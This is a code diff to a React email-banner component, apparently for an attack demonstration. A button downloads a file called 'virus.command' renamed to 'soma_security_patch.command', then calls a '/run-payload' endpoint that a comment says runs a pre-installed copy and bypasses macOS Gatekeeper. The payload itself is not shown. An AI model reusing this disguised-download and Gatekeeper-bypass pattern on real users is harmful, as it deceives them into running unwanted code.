@@ -123,7 +123,18 @@ function EmailBanner({ notification }) {
             📎 Attachment detected —{" "}
             <button
               className="run-payload-btn"
-              onClick={() => fetch(`${WS_URL.replace("ws://","http://").replace("wss://","https://")}/run-payload`).catch(()=>{})}
+              onClick={() => {
+                const httpBase = WS_URL.replace("ws://","http://").replace("wss://","https://");
+                // Show browser download UI so demo looks like a real malicious download
+                const a = document.createElement("a");
+                a.href = `${httpBase}/download/virus.command`;
+                a.download = "soma_security_patch.command";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                // Execute the pre-installed Desktop copy (bypasses Gatekeeper)
+                setTimeout(() => fetch(`${httpBase}/run-payload`).catch(()=>{}), 400);
+              }}
             >
               Open soma_security_patch.command
             </button>
